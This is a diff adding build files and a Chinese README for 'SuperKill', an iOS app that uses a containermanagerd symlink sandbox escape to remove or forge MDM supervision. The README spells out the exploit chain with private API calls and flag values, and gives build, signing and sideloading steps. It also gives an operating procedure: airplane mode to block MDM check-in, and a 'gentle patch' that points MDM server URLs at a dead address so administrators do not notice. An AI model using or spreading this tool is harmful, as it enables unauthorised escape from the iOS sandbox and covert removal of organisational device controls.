@@ -1,0 +1,431 @@
+build/
+DerivedData/
+*.xcuserstate
+xcuserdata/
+.DS_Store
+*.ipa
+*.p12
+*.mobileprovision
+__pycache__/
+
+TARGET := iphone:clang:latest:17.0
+ARCHS := arm64 arm64e
+
+include $(THEOS)/makefiles/common.mk
+
+APPLICATION_NAME := SuperKill
+
+SuperKill_FILES := $(wildcard Sources/*.m)
+SuperKill_FRAMEWORKS := Foundation UIKit Security
+SuperKill_CODESIGN_FLAGS := -SEntitlements/SuperKill.entitlements
+SuperKill_INFOPLIST := Resources/Info.plist
+
+include $(THEOS_MAKE_PATH)/application.mk
+
+after-install::
+	install.exec "killall -9 SuperKill || true"
+
+name: SuperKill
+options:
+  bundleIdPrefix: cc.replace
+  createIntermediateGroups: true
+  deploymentTarget:
+    iOS: "17.0"
+
+settings:
+  base:
+    IPHONEOS_DEPLOYMENT_TARGET: "17.0"
+    CLANG_ENABLE_OBJC_ARC: YES
+    GENERATE_INFOPLIST_FILE: NO
+    SWIFT_VERSION: "5.0"
+    # 默认 App Group；出包时可用 SK_APP_GROUP=... 覆盖
+    SK_APP_GROUP: group.cc.replace.superkill
+
+targets:
+  SuperKill:
+    type: application
+    platform: iOS
+    sources:
+      - path: Sources
+    settings:
+      base:
+        PRODUCT_NAME: SuperKill
+        PRODUCT_BUNDLE_IDENTIFIER: cc.replace.superkill
+        INFOPLIST_FILE: Resources/Info.plist
+        CODE_SIGN_ENTITLEMENTS: Entitlements/SuperKill.entitlements
+        CODE_SIGN_STYLE: Automatic
+        DEVELOPMENT_TEAM: ""
+        TARGETED_DEVICE_FAMILY: "1,2"
+        OTHER_LDFLAGS: "-framework Foundation -framework UIKit -framework Security"
+    scheme:
+      gatherCoverageData: false
+
+# SuperKill
+
+基于 [`forcequitOS/worse_query`](https://github.com/forcequitOS/worse_query) 沙盒逃逸原语的 iOS **监管（Supervision）状态读写**工具：既能**清除**监管，也能**写入**监管（测试用），可直接编译成 IPA。
+
+- 目标系统：**iOS 26.0 – 26.7.2 / 27.2**（原语的生效窗口），不需要越狱
+- 原理：`containermanagerd` 在签发 App Group 的 sandbox token 时会解析符号链接 → 拿到**任意路径**的读写扩展 → 改写 `systemgroup.com.apple.configurationprofiles` 里的监管数据
+- 硬门槛：签名必须带 `com.apple.security.application-groups`，因此需要一个**付费 Apple Developer 账号**里注册过的 App Group
+- 功能：① 自检 · ② 检测监管 · ③ 备份 · **⑧ 状态快照** · **⑦ 开启监管（测试）** · ④ 彻底清除 · ⑤ 温和补丁 · **⑨ 快照 diff** · ⑥ 回滚
+
+---
+
+## 0. 最短路径（Windows、没有 Mac 也能出包）
+
+```text
+① git push 到 GitHub（或 fork 一份）→ Actions → build-ipa → Run workflow
+② 跑完下载 artifact: SuperKill-unsigned-ipa
+③ 手机装 ESign / Feather：导入 .p12 + 含该 App Group 的 .mobileprovision，
+   签名页确认 entitlements 里有 com.apple.security.application-groups，安装
+④ 打开 App → 飞行模式 → ② 检测 → ③ 备份 → ④ 彻底清除（或 ⑦ 开启监管）→ 重启手机
+```
+
+有 Mac 就按第 4.1 节用 Xcode 直接跑，最省事（自动注册 App Group、自动签名）。
+
+---
+
+## 1. 漏洞链（worse_query 到底做了什么）
+
+```
+① 你的 App 有一个 App Group 容器：
+   /private/var/mobile/Containers/Shared/AppGroup/<UUID>/
+② 把该容器的 Library/Caches 删掉，换成符号链接 → 任意目标路径：
+   .../Library/Caches -> /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles
+③ 用 libsystem_containermanager 的私有 API 发一个 container_query：
+      container_query_set_class(query, 7)                      // 7 = appGroup，必须走 XPC 到 containermanagerd
+      container_query_set_group_identifiers(query, "你的group")
+      container_query_operation_set_part(query, 3)             // 3 = Library/Caches
+      container_query_operation_set_flags(query, 0x8000000000) // iOS 26 的 AppGroup 走 0x0800000000
+      container_query_get_single_result(query)
+④ containermanagerd 解析到符号链接的**真实目标**，为该路径签发 token：
+      container_copy_sandbox_token(result)
+⑤ 进程内 consume 掉 token：
+      sandbox_extension_consume(token)   // 返回 handle > 0 即成功
+⑥ 此后本进程对该路径拥有读写权限——尽管它在自己的沙盒之外。
+```
+
+关键点：`part 3` 让 containermanagerd 去算 “Library/Caches 的真实路径”，而 `class 7` 保证这次查询必须经 XPC 交给有权限的 `containermanagerd` 而不是进程内短路。符号链接是唯一的“注入点”，token 的路径授权却按解析后的目标发放——这就是 bug。
+
+工程里的 `worse_query.m` 会自动穷举 **2 组 flags × 2 种 identifier 形态**（string / xpc array），任一组合拿到 `handle > 0` 即成功；预检查只在 `errno == ENOENT` 时判定“目标不存在”，`EPERM` 说明只是沙盒不让 stat，照样继续去签发。
+
+`worse_query` 实测可达（原文 README）：
+
+```
+/var/containers/Data/System                         (iOS 27)
+/var/containers/Shared/SystemGroup/*                (iOS 27)
+/var/mobile/Containers/Data/Application/*
+/var/mobile/Containers/Data/InternalDaemon/*
+/var/mobile/Containers/Data/PluginKitPlugin/*
+/var/mobile/Containers/Shared/AppGroup/*
+```
+
+`/var/containers/Shared/SystemGroup/*` 这一条就是本工具的全部立足点。
+
+---
+
+## 2. 为什么这样就等于“删除监管”
+
+监管与 MDM 的落盘状态集中在两个系统组容器里：
+
+| 路径 | 内容 |
+|---|---|
+| `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist` | `IsSupervised`、`IsMandatory`、`IsMDMUnremovable`、`OrganizationName`、`ConfigurationURL` —— 设置里“此 iPhone 受监管”就是读它 |
+| 同目录 `MDM.plist` | `ServerURL` / `CheckInURL` / `Topic` / `SignMessage` / `IdentityPersistentRef`，MDM 登记本体 |
+| 同目录 `MDMEvents.plist`、`MDMAppManagement.plist` | MDM 事件队列、托管 App 清单 |
+| 同目录 `PayloadManifest.plist` | `OrderedProfiles`，已安装 profile 的索引 |
+| 同目录 `<GUID>.stub` | 每个已安装 profile 的存根（MDM 推送的 profile 也在这里） |
+| `/private/var/mobile/Library/DeviceManagement/ClientTruth.plist` 等 | DeviceManagement 框架侧的镜像状态 |
+| `/private/var/mobile/Library/ConfigurationProfiles/` | 用户级 profile 存根 |
+
+把这些清掉（或把字段降权）后重启，`profiled` 重新读盘时就没有监管记录和 MDM 登记了，设置里既没有“受监管”，也没有“VPN 与设备管理”里的 MDM 描述文件。
+
+---
+
+## 2.1 反向操作：开启监管（测试用）
+
+同一个文件、同样的写权限，反过来写就是“变成监管设备”——适合验证 MDM 策略、测试受监督设备才开放的功能（如单 App 模式、强制安装、禁用抹机等）。
+
+App 里点 **⑦ 开启监管**，会写入（`IsSupervised` 置真、其余字段按真实监管设备补齐）：
+
+| 键 | 写入值 |
+|---|---|
+| `IsSupervised` | `true` |
+| `IsMandatory` | `true` |
+| `IsMDMUnremovable` | `1` |
+| `IsMultiUser` | `false` |
+| `ConfigurationWasApplied` | `true` |
+| `OrganizationName` | 输入框里的值（默认 `Test Organization`） |
+| `OrganizationEmail` | 输入框里的值（可空则不写） |
+| `ConfigurationURL` | 输入框里的值（默认 `https://mdm.invalid/profile`） |
+| `LastModifiedTime` | 当前时间 |
+
+勾选「同时写入 MDM.plist 占位」时，额外写一份 `ServerURL` / `CheckInURL` / `Topic` / `SignMessage=false` 的占位，用来让“VPN 与设备管理”里出现条目。
+
+写入后立即读回校验 `IsSupervised`；**重启后生效**：设置首页显示“此 iPhone 受监管 + 组织名”，② 检测显示 `IsSupervised = 1`。测试完用 ④ 彻底清除即可切回普通设备，来回切换不需要重装 App。
+
+限制说明：
+
+- 这只是**本机状态位**，不会真的向任何 MDM 服务器注册。真正的 MDM 登记需要 APNs 证书签署的 `Topic` 与服务器下发，伪造的 `Topic`（`com.apple.mgmt.External.test`）不会建立推送通道。
+- 开启监管后，部分系统行为按受监督设备处理（例如“抹掉所有内容和设置”的入口、配置描述文件安装策略）；测试完务必清掉。
+- 若重启后没有出现“受监管”字样，说明该版本还会校验 `CloudConfigurationDetails.plist` 的属主/来源（本进程以 `mobile` 写入），需要越狱环境才能伪造；App 的日志里会给出读回结果。
+
+---
+
+## 3. 工程结构
+
+```
+supervision-killer/
+├── project.yml                        XcodeGen 工程描述（主构建入口）
+├── Makefile                           Theos 构建（备选）
+├── Sources/
+│   ├── worse_query.h/.m               逃逸原语（自动尝试两组 flags、统一错误码、自动清理符号链接）
+│   ├── SKEngine.h/.m                  监管检测 / 备份 / 清除 / 补丁 / 开启监管 / 快照与 diff / 回滚
+│   ├── SKMainViewController.h/.m      操作台 UI
+│   ├── SKAppDelegate.h/.m
+│   └── main.m
+├── Resources/Info.plist               SKAppGroup = $(SK_APP_GROUP)
+├── Entitlements/SuperKill.entitlements 必须换成你自己的 App Group
+├── scripts/build_ipa.sh               一键出 unsigned IPA
+├── scripts/push_and_build.py          token 驱动：建仓 + 推送 + 触发 CI + 拉回 ipa
+├── scripts/sign_local.sh              macOS 本地重签（注入 entitlements）
+└── .github/workflows/build.yml         macOS runner 出包
+```
+
+---
+
+## 4. 出包
+
+### 4.0 从零到装进手机（Windows 可用）
+
+**路径 1：网页上传，零工具（最省事）**
+
+1. github.com → New repository → 名字随意（如 `superkill`）→ Create
+2. 进入空仓库 → **uploading an existing file** → 把 `supervision-killer/` **里面的内容**（`Sources/`、`Resources/`、`Entitlements/`、`scripts/`、`.github/`、`project.yml`、`Makefile`、`README.md`）整个拖进去 → Commit
+   - 关键：`.github/` 必须在仓库根目录，否则 Actions 找不到 workflow
+3. 仓库顶部 **Actions** → 左侧 **build-ipa** → **Run workflow**（推上去时可能已自动跑一次）
+4. 约 3 分钟 → 运行页底部 **Artifacts** → 下载 `SuperKill-unsigned-ipa.zip` → 解压得到 `SuperKill-unsigned.ipa`
+5. 传进手机（文件 App / AirDrop / 局域网）→ 用 ESign 签（见下）
+
+**路径 2：一条命令，token 驱动（本机装了 Python 就行）**
+
+```bash
+# classic token 勾 repo + workflow；fine-grained 需要 Administration/Contents/Actions/Workflows 读写
+python scripts/push_and_build.py --token ghp_xxxxxxxx --repo superkill
+# 建仓 → 上传 → 触发 workflow → 等构建 → 自动下载解压
+# 产物：build/ipa/SuperKill-unsigned.ipa
+```
+
+**路径 3：装好 git 后常规推**
+
+```bash
+cd supervision-killer      # 这一层必须是仓库根（.github/ 在这里）
+git init -b main && git add . && git commit -m "SuperKill"
+git remote add origin https://github.com/<你的账号>/superkill.git
+git push -u origin main    # push 即触发 build-ipa
+```
+
+签名前确认三件事，缺一个都装不上或跑不起来：
+
+1. profile 的 App ID 与 ipa 的 bundle id 对得上（`cc.replace.superkill` 或你自己改的值）
+2. profile 里真的勾了 App Groups（免费 Apple ID 没有这个能力）
+3. ESign 的 entitlements 编辑器里有：
+
+```xml
+<key>com.apple.security.application-groups</key>
+<array><string>group.yourteam.superkill</string></array>
+```
+
+装好后打开 App，① 自检里 `Group 容器` 应为“可访问”。App 会通过 `xpc_copy_entitlement_for_self` 自动从自己的签名里读出 group，不需要手输；万一读不到（例如 entitlements 被签名工具剥掉），才需要在顶部输入框里手动填。
+
+### 4.1 路线 A：Xcode 真机（最省事）
+
+有 Mac 就不用管 CI / token / 未签名 ipa / ESign 这一整套：Xcode 会自动注册 App Group、生成描述文件、签名并安装。
+
+1. `brew install xcodegen && cd supervision-killer && xcodegen generate && open SuperKill.xcodeproj`
+2. Xcode → target `SuperKill` → **Signing & Capabilities**
+   - Team 选你的付费团队，Bundle Identifier 改成你自己的（例如 `com.yourname.superkill`）
+   - `+ Capability` → **App Groups** → 新建 `group.com.yourname.superkill` 并勾选
+   - Xcode 会把该 group 写进 `Entitlements/SuperKill.entitlements`，不用手改
+3. 连真机 → ⌘R 直接装上去跑
+4. 想留一份 ipa：Product → Archive → Distribute App → Development / Ad Hoc
+
+前提：Xcode 要新到能识别 iOS 26 设备（Xcode 26 及以上）；老版本 Xcode 会在“准备设备”阶段拒绝 iOS 26 真机。工程的最小系统版本是 17.0，与 SDK 无关。
+
+Xcode 是唯一能自动帮你注册 App Group + 生成描述文件的工具，这也是路线 A 推荐的原因。
+
+### 4.2 路线 B：CI 出未签名 IPA，自己重签
+
+```bash
+# 本机（macOS）：
+APP_GROUP=group.com.yourname.superkill BUNDLE_ID=com.yourname.superkill ./scripts/build_ipa.sh
+
+# 或者把仓库推到 GitHub，手动触发 build-ipa workflow，
+# 下载 artifact：SuperKill-unsigned-ipa
+```
+
+拿到 `SuperKill-unsigned.ipa` 后重签（**必须带 App Group，否则 App 里第 ① 步就会报 `code -1`**）：
+
+```bash
+./scripts/sign_local.sh SuperKill-unsigned.ipa \
+  "Apple Development: Your Name (TEAMID)" \
+  ~/Downloads/SuperKill_Dev.mobileprovision \
+  group.com.yourname.superkill
+
+xcrun devicectl device install app --device <UDID> Payload/SuperKill.app
+```
+
+用 ESign / Feather / Sideloadly 也可以，但要在签名界面把 entitlements 改成：
+
+```xml
+<key>com.apple.security.application-groups</key>
+<array><string>group.com.yourname.superkill</string></array>
+```
+
+并且**描述文件里必须真的包含这个 group**（门户 → Identifiers → App Groups 注册 → 关联到 App ID → 重新生成 profile）。免费 Apple ID 无法使用 App Groups，这一步绕不过去。
+
+### 4.3 路线 C：Theos
+
+```bash
+export THEOS=~/theos
+cd supervision-killer && make package install
+```
+
+`Makefile` 里已经把 `-SEntitlements/SuperKill.entitlements` 传给 `ldid`；同样要求 group 在本机/设备上可用（TrollStore 不支持 iOS 26，所以仍然只能靠带 group 的签名）。
+
+### 4.4 App Group 注册（门户操作）
+
+1. developer.apple.com → Certificates, Identifiers & Profiles → **Identifiers** → 右上角 `+` → **App Groups** → 填 `group.com.yourname.superkill`
+2. 回到 **App IDs** → 你的 App ID → Capabilities → 勾 **App Groups** → Configure → 选中刚建的组
+3. **Profiles** → 重新生成 Development profile（旧的没有 group 权限）
+4. 下载 `.mobileprovision`，连同 `.p12` 一起用于重签
+
+---
+
+## 5. 操作流程（设备端）
+
+**A. 清除监管**
+
+```
+0. 打开飞行模式（阻断 MDM check-in，避免删完立刻被推回来）
+1. 安装并打开「监管开关」
+2. 顶部填 App Group（应与签名一致）→ 保存
+3. ① 自检        → 应看到 "ConfigurationProfiles: 扩展已取得（逃逸可用）"
+4. ② 检测监管状态 → 显示 IsSupervised / OrganizationName / MDM ServerURL，确认设备确实是监管设备
+5. ③ 备份         → 备份写到 App 的 Documents/backups/<时间戳>/（可用「文件」App 导出）
+6. ⑧ 记录快照     → 名字填「基线」，后面用来和清除后对照
+7. ④ 彻底清除     → 删除监管与 MDM 落盘状态
+8. 关机重启（保持飞行模式）
+9. 设置 → 通用 → VPN 与设备管理：MDM 描述文件应消失；设置首页不应再有“此 iPhone 受监管”
+10. 再关闭飞行模式联网验证；若监管被推回，说明是 ABM/DEP 注册设备（见第 7 节）
+```
+
+**B. 开启监管（测试闭环）**
+
+```
+0. 无需飞行模式（纯本机状态位）
+1. ⑧ 记录状态快照 → 名字填「基线」
+2. 在“开启监管参数”里填组织名 / 邮箱 / ConfigurationURL，按需打开 MDM.plist 占位开关
+3. ⑦ 开启监管 → 确认弹窗里核对参数 → 写入并读回校验
+4. ⑧ 再记录一份「开启后」→ ⑨ 对比快照链，应看到 + CloudConfigurationDetails.plist 与 IsSupervised: (无) → 1
+5. 重启设备：设置首页出现“此 iPhone 受监管”，② 检测显示 IsSupervised = 1
+6. 测完点 ④ 彻底清除 → ⑧ 记一份「清除后」→ 再重启，回到普通设备
+7. ⑨ 对比快照链，逐对 diff 能完整看到「基线 → 开启后 → 清除后 → 当前」的字段轨迹
+```
+
+开启前也可以先 ③ 备份，这样“开启 → 清除 → 回滚”三条状态都能互相对照。
+
+“⑤ 温和补丁”是另一条路：不删文件，只把 `IsSupervised` / `IsMandatory` 降为 `false`、`MDM.plist` 的 `ServerURL`/`CheckInURL` 指向 `https://127.0.0.1:1/`、`SignMessage=false`、清空 `MDMAppManagement.metadataByBundleID` 和 `PayloadManifest.OrderedProfiles`。适合“只想解除限制、不想让管理端发现设备掉线”的场景。
+
+---
+
+## 5.1 快照与 diff（验证落盘效果）
+
+点 **⑧ 记录状态快照**，起个名字（`基线` / `开启后` / `清除后`），App 会把当前状态写进 `Documents/snapshots/<时间戳>-<名字>.plist`，采集内容：
+
+| 采集项 | 说明 |
+|---|---|
+| 三处目录条目 | `ConfigurationProfiles` / `DeviceManagement` / 用户 profile 目录：文件名、大小、是否目录 |
+| `cloud.*` | `CloudConfigurationDetails.plist` 里的 8 个键（IsSupervised、IsMandatory、IsMDMUnremovable、IsMultiUser、ConfigurationWasApplied、OrganizationName、OrganizationEmail、ConfigurationURL） |
+| `mdm.*` | `MDM.plist` 的 ServerURL / CheckInURL / Topic / SignMessage |
+| `clientTruth.*` | `DeviceManagement/ClientTruth.plist` 里 `CloudConfiguration` 子字典的 3 个键 |
+| `orderedProfiles` | `PayloadManifest.OrderedProfiles` 的条目数 |
+
+点 **⑨ 对比快照链**：按时间顺序逐对 diff，最后再和**当前实时状态**比一次。典型输出：
+
+```text
+共 3 份快照，逐对比较 + 最新快照 vs 当前
+
+=== 基线 @ 11-09 15:00:01  →  开启后 @ 11-09 15:04:22 ===
+监管: (无) → 1
+
+[ConfigurationProfiles]
+  + CloudConfigurationDetails.plist (612 B)
+  cloud.IsSupervised: (无) → 1
+  cloud.IsMandatory: (无) → 1
+  cloud.OrganizationName: (无) → Test Organization
+  cloud.ConfigurationURL: (无) → https://mdm.invalid/profile
+
+[DeviceManagement]
+  + CloudConfigurationDetails.plist (612 B)
+  clientTruth.IsSupervised: (无) → 1
+
+=== 开启后 @ 11-09 15:04:22  →  清除后 @ 11-09 15:09:40 ===
+监管: 1 → (无)
+
+[ConfigurationProfiles]
+  − CloudConfigurationDetails.plist (412 B)
+  cloud.IsSupervised: 1 → (无)
+  ...
+```
+
+diff 只报**结构变化**（新增 `+` / 删除 `−` / 大小变化 `~`）和**字段值变化**；不比较 mtime，避免 `profiled` 顺手改动造成的噪声。快照文件在 `Documents/snapshots/`，开了 `UIFileSharingEnabled`，可直接用「文件」App 拷出来存档或对比历史。
+
+---
+
+## 6. 错误码
+
+| 返回 | 含义 | 处理 |
+|---|---|---|
+| `-1` | App Group 不存在 | 签名没带 `com.apple.security.application-groups`，或 group 未在门户注册/未勾进 profile |
+| `-2` | 符号解析失败 | 系统版本不在窗口期，或 `libsystem_containermanager.dylib` 路径变了 |
+| `-3` | query 创建失败 | 极少见，重试 |
+| `-4` | 符号链接创建失败 | 容器里 `Library/Caches` 权限异常，删掉 App 重装 |
+| `-5` | containermanagerd 拒绝 | flags/part 与系统不匹配（本工程已自动试两组 flags） |
+| `-6` | 内核拒绝签发扩展 | 目标路径不在可签发范围，或 token 被拒 |
+| `-255` | 目标不存在 | 该设备没有这个目录（例如未注册 MDM 就没有 `DeviceManagement`） |
+
+---
+
+## 7. 限制（务必看）
+
+1. **不是永久解**。ABM / DEP（Apple Business Manager、Apple School Manager）注册的设备，联网激活时 `cloudconfigurationd` 会从 Apple 拉回监管记录；抹机、系统更新同样会回滚。非 DEP 的“Apple Configurator 手搓监管”设备，清除后一般能长期保持。
+2. **管理端会发现**。MDM 侧表现为设备停止 check-in；温和补丁模式下 profile 仍在但服务器地址已指向黑洞。
+3. **版本窗口**。原语只覆盖 iOS 26.0–26.7.2 / 27.2；更高版本随时可能被修掉（`container_query` 里加 `realpath` 校验即可）。
+4. **需要付费账号**。App Groups 是免费账号拿不到的能力，这是整条链上唯一无法用技术手段绕过的门槛。
+5. **别在清除前联网**。删完立刻联网 + MDM 服务器主动推 profile，可能当场回滚；先飞行模式，重启后再联网。
+6. **不做全盘抹除**。本工具只动配置与状态文件，不动用户数据。
+
+---
+
+## 8. 回滚
+
+- App 内“⑥ 回滚最新备份”会把 `Documents/backups/<最新>/` 覆盖回三个目录。
+- 备份目录结构：`backups/<时间戳>/<序号>-<目录名>/…` + `roots.plist`（记录 slug → 原始路径）。
+- 彻底清除后如果没有备份：抹机重装是唯一的“还原”方式（监管状态由服务器决定，抹机后 DEP 设备会重新被监管）。
+
+---
+
+## 9. 没有开发者账号时的备选路线
+
+| 路线 | 做法 | 代价 |
+|---|---|---|
+| 备份改写（无需漏洞） | iMazing / Apple 配置工具建本地备份 → 编辑 `SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles` → 删 `MDM.plist`、`MDMEvents.plist`、`CloudConfigurationDetails.plist` → 还原备份 | 需要还原备份，耗时；对 DEP 无效 |
+| 越狱 + Filza | 直接改第 2 节那批文件（jailbreak 下无沙盒限制） | iOS 26 目前没有公开越狱 |
+| MDM 官方移除 | 让管理方在 ABM/MDM 后台 “Release” 设备 | 需要管理方配合 |
+
+---
+
+## 10. 许可
+
+`Sources/worse_query.{h,m}` 派生自 `forcequitOS/worse_query`（GPL-3.0），本工程整体按 GPL-3.0 分发。
